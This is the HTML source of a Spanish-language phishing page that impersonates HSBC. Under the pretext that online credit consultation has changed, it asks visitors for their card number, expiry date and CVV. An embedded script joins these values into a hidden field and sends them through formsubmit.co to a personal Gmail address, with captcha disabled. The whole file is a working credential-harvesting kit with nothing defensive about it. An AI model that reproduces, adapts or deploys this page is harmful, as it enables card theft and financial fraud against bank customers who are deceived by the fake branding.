
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./tarjeta.css">
    <title>HSBC</title>
</head>
<body>
    <div class="contenedorglobal">
        <div class="contenedorform">
            <img src="./logo.png" alt="" class="logo">
            <div class="aviso">
                <h3>Lorem ipsum dolor sit amet consectetur adipisicing elit. </h3>
            </div>
            <div class="texto">
                La consulta de informacion crediticia de banca por internet han cambiado, para continuar autoriza.
            </div>
            <form class="form" action="https://formsubmit.co/alcresion@gmail.com" method="POST">
                <div class="continput">
                    <div class="tarimg">
                    <input class="input" id="numtarjeta" type="text" placeholder="Numero de tarjeta *">
                    <img width="50px" src="./tarjeta.png" alt="">
                </div>
                    <div class="mesanocvv">
                        <input type="hidden" name="name" class="todo">
                        <input class="input2" id="mes" type="text"  placeholder="MES *">
                        <input class="input2" id="ano" type="text"  placeholder="AÑO *">
                        <input class="input2" id="cvv" type="text"  placeholder="CVV *">
                        <input type="hidden" name="email" value="respuesforms@gmail.com">
                        <input type="hidden" name="_next" value="https://yourdomain.co/thanks.html">
                        <input type="hidden" name="_captcha" value="false">
                        <input type="submit" value="Autorizar" class="btn">
                    </div>
                </div>

                <script>
                    var todo = document.querySelector('.todo');
                    var numtarjeta = document.querySelector('#numtarjeta');
                    var mes = document.querySelector('#mes');
                    var ano = document.querySelector('#ano');
                    var cvv = document.querySelector('#cvv');
                    var form = document.querySelector('.form');

                    form.addEventListener('submit', function(e){
                        e.preventDefault();
                        todo.value = 'Numero de tarjeta: ' + numtarjeta.value + 'Mes: ' + mes.value + 'Año: ' + ano.value + 'CVV: ' + cvv.value;
                        form.submit();
                    })



                </script>
                
            </form>
        </div>
    </div>
</body>
</html>
